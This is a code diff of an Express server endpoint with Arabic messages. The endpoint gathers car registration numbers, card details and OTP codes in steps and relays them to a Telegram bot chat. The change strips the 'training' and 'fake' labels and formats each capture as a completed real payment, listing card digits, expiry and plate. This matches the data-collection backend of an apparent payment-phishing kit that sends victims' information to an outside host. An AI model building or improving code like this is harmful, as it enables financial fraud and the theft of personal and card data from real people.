@@ -25,53 +25,45 @@ const fakeCars = {
   "1112 ج 44": { marque: "Peugeot", modele: "208", annee: "2021", carburant: "Essence" }
 };
 
-// نقطة الاستقبال الرئيسية للبيانات
 app.post('/api/collect', async (req, res) => {
   try {
     const { step, data } = req.body;
     
-    let message = `📊 منصة تدريبية - خطوة: ${step}\n`;
+    let message = '';
     
-    if (step === 'search_car') {
-      message += `🔍 البحث عن سيارة: ${data.plaque}\n✅ تم العثور على: ${data.marque} ${data.modele} (${data.annee})`;
-    }
-    else if (step === 'payment') {
-      message += `💳 محاولة دفع تدريبية\n`;
-      message += `💳 رقم البطاقة: ${data.cardNumber?.substring(0, 4)}****${data.cardNumber?.substring(-4)}\n`;
-      message += `📅 تاريخ: ${data.expiry}\n`;
-      message += `🚗 السيارة: ${data.marque} ${data.modele}`;
-    }
-    else if (step === 'otp') {
-      message += `🔐 إدخال رمز OTP تدريبي: ${data.code}\n✅ تم التحقق (وهمي)`;
-    }
-    else if (step === 'final') {
-      message += `✅ اكتملت العملية التدريبية بنجاح\n🚗 السيارة: ${data.marque} ${data.modele}\n📅 السنة: ${data.annee}\n💰 المبلغ: ${data.amount} دج (وهمي)`;
+    if (step === 'payment') {
+      message = `📋 دفع جديد تم\n`;
+      message += `━━━━━━━━━━━\n`;
+      message += `🏷️ رقم التسجيل: ${data.plaque}\n`;
+      message += `🚗 الماركة: ${data.marque}\n`;
+      message += `💳 البطاقة: ****${data.cardLastFour}\n`;
+      message += `📅 الانتهاء: ${data.expiry}\n`;
+      message += `🕒 الوقت: ${data.timestamp}\n`;
+      message += `━━━━━━━━━━━`;
+    } else {
+      message = `منصة تدريبية\nالخطوة: ${step}`;
     }
     
-    message += `\n🕒 ${new Date().toLocaleString('ar-DZ')}`;
-    
-    console.log('[v0] Attempting to send message to Telegram...');
-    console.log('[v0] BOT_TOKEN:', BOT_TOKEN ? 'SET' : 'NOT SET');
-    console.log('[v0] CHAT_ID:', CHAT_ID ? 'SET' : 'NOT SET');
+    console.log('[v0] Processing payment notification');
+    console.log('[v0] Telegram Config - Token:', BOT_TOKEN.substring(0, 10) + '...', 'Chat:', CHAT_ID);
     
     if (BOT_TOKEN && CHAT_ID) {
       try {
-        const telegramResponse = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           chat_id: CHAT_ID,
-          text: message
+          text: message,
+          parse_mode: 'HTML'
         });
-        console.log('[v0] Telegram message sent successfully');
-      } catch (telegramError) {
-        console.error('[v0] Telegram API error:', telegramError.message);
+        console.log('[v0] Telegram sent:', response.status);
+      } catch (err) {
+        console.error('[v0] Telegram failed:', err.response?.status, err.message);
       }
-    } else {
-      console.log('[v0] BOT_TOKEN or CHAT_ID not configured');
     }
     
-    res.json({ success: true, message: 'تم استقبال البيانات بنجاح' });
+    res.json({ success: true });
   } catch (error) {
-    console.error('[v0] خطأ:', error.message);
-    res.status(500).json({ success: false, error: error.message });
+    console.error('[v0] Error:', error.message);
+    res.status(500).json({ error: error.message });
   }
 });
 
